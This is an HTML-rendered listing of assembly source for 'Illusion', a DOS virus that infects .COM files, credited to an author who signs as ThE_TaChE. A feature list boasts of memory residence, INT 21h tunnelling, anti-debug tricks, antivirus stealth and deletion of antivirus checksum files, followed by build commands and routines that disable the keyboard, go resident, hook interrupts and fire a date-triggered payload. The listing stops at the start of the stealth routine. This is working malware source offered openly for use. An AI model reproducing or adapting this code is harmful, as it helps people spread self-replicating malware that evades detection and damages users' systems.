<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=UTF-8">
<title>Win32.Elections - Illusion.ASM.html</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc3 {
	color: #808080;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">; Virus Name:  Illusion</span><span class="sc0">
</span><span class="sc1">; Author    :  ThE_TaChE</span><span class="sc0">
</span><span class="sc1">; Origin    :  México, 2006.</span><span class="sc0">
</span><span class="sc1">; Lenght    :  1332 bytes ( 666 * 2 )   };-)</span><span class="sc0">


</span><span class="sc1">; Illusion is my first released virus , it`s lame  .. i know, and is not </span><span class="sc0">
</span><span class="sc1">; optimized at all , but i write this virus just to test my "Full Thunderbyte</span><span class="sc0">
</span><span class="sc1">; Stealth" tutorial , tested under TBAV v8.0 with magnific results .. 0 flags</span><span class="sc0">
</span><span class="sc1">; in high-heuristic sensibility ..... hope Veldams enjoy it ;-).</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;ÚÄÄÄÄÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">;³  Features  ³</span><span class="sc0">
</span><span class="sc1">;ÀÄÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; -Memory Resident (MCB)</span><span class="sc0">
</span><span class="sc1">; -Infects .COM files except COMMAND.COM  on Executing (4Bh) and Chmod (43h)</span><span class="sc0">
</span><span class="sc1">; -Tunneling routine tracing under the PSP. </span><span class="sc0">
</span><span class="sc1">; -Anti-Debug and Emulation Code.</span><span class="sc0">
</span><span class="sc1">; -Fools "F-POTATOE Stealth Detection" and disable Stealth when a compress</span><span class="sc0">
</span><span class="sc1">;  util are running.</span><span class="sc0">
</span><span class="sc1">; -Hook Int 24h to hide errors.</span><span class="sc0">
</span><span class="sc1">; -Delete CRC Checksums ( In current DIR )                          </span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;    -&gt; anti-vir.dat</span><span class="sc0">
</span><span class="sc1">;    -&gt; avp.crc</span><span class="sc0">
</span><span class="sc1">;    -&gt; chklist.tav</span><span class="sc0">
</span><span class="sc1">;    -&gt; chklist.ms</span><span class="sc0">
</span><span class="sc1">;    -&gt; ivb.ntz</span><span class="sc0">
</span><span class="sc1">;    -&gt; smartchk.cps</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Thx go to:    All 29A staff and all the channels #virus </span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Fucks go to:  Well , they know who they are.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;     ThE_TaChE</span><span class="sc0">
</span><span class="sc1">; tache.525@hotmail.com</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;-=[ "Information is the greatest weapon of power to the modern wizard." ]=-</span><span class="sc0">

</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; To assembly:  TASM /M Illusion.ASM</span><span class="sc0">
</span><span class="sc1">;               TLINK Illusion</span><span class="sc0">
</span><span class="sc1">;               EXE2COM Illusion.EXE Illusion.COM</span><span class="sc0">


              </span><span class="sc2">.286</span><span class="sc0">
       </span><span class="sc5">Illusion</span><span class="sc0">       </span><span class="sc9">segment</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">public</span><span class="sc0">
              </span><span class="sc9">assume</span><span class="sc0">  </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">Illusion</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">Illusion</span><span class="sc0">
              </span><span class="sc9">org</span><span class="sc0">     </span><span class="sc2">0h</span><span class="sc0">                 


</span><span class="sc5">Illusion_size</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc4">(</span><span class="sc5">Illusion_end</span><span class="sc4">-</span><span class="sc5">Illusion_start</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">Illusion_start</span><span class="sc0">     </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">


</span><span class="sc1">;*****************************************************************************</span><span class="sc0">
</span><span class="sc1">;                        CALCULATE DELTA-OFFSET                              *</span><span class="sc0">
</span><span class="sc1">;*****************************************************************************</span><span class="sc0">

</span><span class="sc5">Virus_Illusion</span><span class="sc4">:</span><span class="sc0">
           </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Delta_offset</span><span class="sc0">                   

</span><span class="sc5">Delta_offset</span><span class="sc4">:</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">sp</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">         
           </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">delta_offset</span><span class="sc0">           </span><span class="sc1">;Get ê-Offset             </span><span class="sc0">
           </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">

           </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Disable_KB</span><span class="sc0">                       </span><span class="sc1">;Turn off Keyboard !</span><span class="sc0">

</span><span class="sc1">;*****************************************************************************</span><span class="sc0">
</span><span class="sc1">;                   ANTI-DEBUG/EMULATION TRICK                               *</span><span class="sc0">
</span><span class="sc1">;*****************************************************************************</span><span class="sc0">

</span><span class="sc5">Fuck_TRACE</span><span class="sc4">:</span><span class="sc0">    
           </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">
           </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
           </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">sp</span><span class="sc0">
           </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">sp</span><span class="sc0">
           </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
           </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">                            </span><span class="sc1">;Are we beging</span><span class="sc0">
           </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">Check_for_TSR</span><span class="sc0">                    </span><span class="sc1">;Traced?</span><span class="sc0">
           </span><span class="sc6">hlt</span><span class="sc0">                                    
           </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">19h</span><span class="sc0">                              </span><span class="sc1">;!! FUCK OFF !!</span><span class="sc0">

</span><span class="sc1">;*****************************************************************************</span><span class="sc0">
</span><span class="sc1">;                         CHECK FOR TSR                                      *</span><span class="sc0">
</span><span class="sc1">;*****************************************************************************</span><span class="sc0">

</span><span class="sc5">Check_for_TSR</span><span class="sc4">:</span><span class="sc0"> 
           </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3066h</span><span class="sc0">                         </span><span class="sc1">;Check if we are TSR </span><span class="sc0">
           </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
           
           </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">555h</span><span class="sc0">                          </span><span class="sc1">;Are we already</span><span class="sc0">
           </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">Check_Date</span><span class="sc0">                       </span><span class="sc1">;memory resident ?</span><span class="sc0">
           </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">Return_File</span><span class="sc0">

</span><span class="sc1">;*****************************************************************************</span><span class="sc0">
</span><span class="sc1">;                        GET-DATE  ROUTINE                                   *</span><span class="sc0">
</span><span class="sc1">;*****************************************************************************</span><span class="sc0">

</span><span class="sc5">Check_Date</span><span class="sc4">:</span><span class="sc0">                                       
           </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">2bh</span><span class="sc0">                           </span><span class="sc1">;Get Date</span><span class="sc0">
           </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc0">
           </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
           </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc2">07h</span><span class="sc0">                        
           </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">Check_Date2</span><span class="sc0">   
           </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc0">                           </span><span class="sc1">;It`s our time ? </span><span class="sc0">
           </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">Check_Date2</span><span class="sc0">   
           </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">PAYLOAD</span><span class="sc0">                          </span><span class="sc1">;Go to PAYLOAD !!</span><span class="sc0">
                           
</span><span class="sc5">Check_Date2</span><span class="sc4">:</span><span class="sc0">   
           </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">                            
           </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">Tunnel_21h</span><span class="sc0">                       </span><span class="sc1">;More dates !</span><span class="sc0">
           </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">05h</span><span class="sc0">                            
           </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">Tunnel_21h</span><span class="sc0">
           </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">PAYLOAD</span><span class="sc0">                          </span><span class="sc1">;Go to PAYLOAD !!</span><span class="sc0">

</span><span class="sc5">Illusion_LiveS</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'-&gt;#ThE_WiZArD'</span><span class="sc0">

</span><span class="sc1">;*****************************************************************************</span><span class="sc0">
</span><span class="sc1">;                     TUNNEL INT21h TRACING THE PSP                          *</span><span class="sc0">
</span><span class="sc1">;*****************************************************************************</span><span class="sc0">

</span><span class="sc5">Tunnel_21h</span><span class="sc4">:</span><span class="sc0">  
           </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3621h</span><span class="sc0">
           </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc0">
           </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                              </span><span class="sc1">;Get INT 21h Vector</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">OldInt21h</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">                             
           </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">OldInt21h</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc8">es</span><span class="sc0"> </span><span class="sc1">;Save it               </span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">Tunnel21h</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">Tunnel21h</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc8">es</span><span class="sc0">
           </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
           </span><span class="sc6">nop</span><span class="sc0">
           </span><span class="sc6">lds</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">0006h</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">Tracear</span><span class="sc4">:</span><span class="sc0">       
           </span><span class="sc6">nop</span><span class="sc0">
           </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc2">0eah</span><span class="sc0">            </span><span class="sc1">;JMP FAR ?</span><span class="sc0">
           </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">Chekear</span><span class="sc0">
           </span><span class="sc6">lds</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
           </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc2">9090h</span><span class="sc0">           </span><span class="sc1">;Double Nop ?</span><span class="sc0">
           </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">Tracear</span><span class="sc0">
           </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">32h</span><span class="sc0">
           </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc2">9090h</span><span class="sc0">           </span><span class="sc1">;Double Nop ?</span><span class="sc0">
           </span><span class="sc6">nop</span><span class="sc0">
           </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">Chekear</span><span class="sc0">
</span><span class="sc5">Hallado</span><span class="sc4">:</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">Tunnel21h</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">    </span><span class="sc1">;OK , We found it !!</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">Tunnel21h</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">ds</span><span class="sc0">
           </span><span class="sc6">nop</span><span class="sc0">
           </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">Install_MCB</span><span class="sc0">
</span><span class="sc5">Chekear</span><span class="sc4">:</span><span class="sc0">
           </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc2">2e1eh</span><span class="sc0">
           </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">Install_MCB</span><span class="sc0">
           </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">25h</span><span class="sc0">
           </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc2">80fah</span><span class="sc0">
           </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">Hallado</span><span class="sc0">
           
</span><span class="sc1">;*****************************************************************************</span><span class="sc0">
</span><span class="sc1">;                        ROUTINE TO GO TSR                                   *</span><span class="sc0">
</span><span class="sc1">;*****************************************************************************</span><span class="sc0">
</span><span class="sc5">Install_MCB</span><span class="sc4">:</span><span class="sc0"> 
           </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
           
           </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc0">
           </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                            </span><span class="sc1">;Program's MCB segment</span><span class="sc0">
           </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">

           </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc12">'Y'</span><span class="sc0">             </span><span class="sc1">;Is it a Z block?</span><span class="sc0">
           </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">MCB_OK</span><span class="sc0">                           </span><span class="sc1">;YES !!</span><span class="sc0">
           </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">Return_File</span><span class="sc0">                      </span><span class="sc1">;No .. Exit .. </span><span class="sc0">

</span><span class="sc5">MCB_OK</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">],((</span><span class="sc5">Illusion_Size</span><span class="sc4">/</span><span class="sc2">10h</span><span class="sc4">)+</span><span class="sc2">2</span><span class="sc4">)</span><span class="sc0">
           </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">12h</span><span class="sc4">],((</span><span class="sc5">Illusion_Size</span><span class="sc4">/</span><span class="sc2">10h</span><span class="sc4">)+</span><span class="sc2">2</span><span class="sc4">)</span><span class="sc0">
           </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">]</span><span class="sc0">
           </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">

           </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc12">'Z'</span><span class="sc0">             </span><span class="sc1">;Mark block as Z</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc2">8</span><span class="sc0">             </span><span class="sc1">;System memory</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">],((</span><span class="sc5">Illusion_Size</span><span class="sc4">/</span><span class="sc2">10h</span><span class="sc4">)+</span><span class="sc2">1</span><span class="sc4">)</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc2">4f44h</span><span class="sc0">         </span><span class="sc1">;Mark block as owned</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">0ah</span><span class="sc4">],</span><span class="sc2">0053h</span><span class="sc0">       </span><span class="sc1">;by DOS (444f53h,0)</span><span class="sc0">
           </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">

           </span><span class="sc6">cld</span><span class="sc0">
           </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
           </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">Illusion_SiZe</span><span class="sc0">                 </span><span class="sc1">;Copy virus to memory</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">
           </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">

</span><span class="sc1">;*****************************************************************************</span><span class="sc0">
</span><span class="sc1">;                        SET INTERRUPTION 21H                                *</span><span class="sc0">
</span><span class="sc1">;*****************************************************************************</span><span class="sc0">
</span><span class="sc5">Set_int21h</span><span class="sc4">:</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">22h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc0">                         </span><span class="sc1">;Original vector</span><span class="sc0">

           </span><span class="sc6">cli</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">INT21_Illusion</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">               </span><span class="sc1">;Set ours</span><span class="sc0">
           </span><span class="sc6">sti</span><span class="sc0">

</span><span class="sc5">Return_File</span><span class="sc4">:</span><span class="sc0"> 
           </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
           </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
           
           </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Enable_KB</span><span class="sc0">                        </span><span class="sc1">;Enables Keyboard</span><span class="sc0">
           
           
</span><span class="sc1">;*****************************************************************************</span><span class="sc0">
</span><span class="sc1">;                   RESTORE .COM file AND SET REGISTERS = 0                  *</span><span class="sc0">
</span><span class="sc1">;*****************************************************************************</span><span class="sc0">

</span><span class="sc5">Exit_COM</span><span class="sc4">:</span><span class="sc0">      
           </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Buffer_COM</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;SI points to original </span><span class="sc0">
                            </span><span class="sc1">;start</span><span class="sc0">
           </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">100h</span><span class="sc0">
           </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">                               </span><span class="sc1">;Save DI to Stack to </span><span class="sc0">
           </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">                               </span><span class="sc1">;return to program ...</span><span class="sc0">
           </span><span class="sc6">movsw</span><span class="sc0">                                    </span><span class="sc1">;Copy three bytes</span><span class="sc0">
           </span><span class="sc6">movsb</span><span class="sc0">                                 
           
</span><span class="sc5">Reset_Reg</span><span class="sc4">:</span><span class="sc0">     
           </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
           </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">                            </span><span class="sc1">;Set registers to 0</span><span class="sc0">
           </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
           </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
           </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
           </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">
           
           </span><span class="sc6">ret</span><span class="sc0">                                      </span><span class="sc1">;Return to host</span><span class="sc0">
           
</span><span class="sc1">;*****************************************************************************</span><span class="sc0">
</span><span class="sc1">;                         DISABLE KEYBOARD                                    *</span><span class="sc0">
</span><span class="sc1">;*****************************************************************************</span><span class="sc0">

</span><span class="sc5">Disable_KB</span><span class="sc4">:</span><span class="sc0">                                    
           </span><span class="sc6">in</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">21h</span><span class="sc0">                    
           </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">00000010b</span><span class="sc0">
           </span><span class="sc6">out</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                           </span><span class="sc1">;Disable KeyBoard</span><span class="sc0">
           </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;*****************************************************************************</span><span class="sc0">
</span><span class="sc1">;                         ENABLE KEYBOARD                                    *</span><span class="sc0">
</span><span class="sc1">;*****************************************************************************</span><span class="sc0">

</span><span class="sc5">Enable_KB</span><span class="sc4">:</span><span class="sc0">         
           </span><span class="sc6">in</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">21h</span><span class="sc0">                           </span><span class="sc1">;Enable KeyBoard</span><span class="sc0">
           </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
           </span><span class="sc6">out</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
           </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc1">;*****************************************************************************</span><span class="sc0">
</span><span class="sc1">;                               FCB STEALTH                                  *</span><span class="sc0">
</span><span class="sc1">;*****************************************************************************</span><span class="sc0">

</span><span class="sc5">Fcb_Stealth</span><span class="sc4">:</span><span class="sc0">    
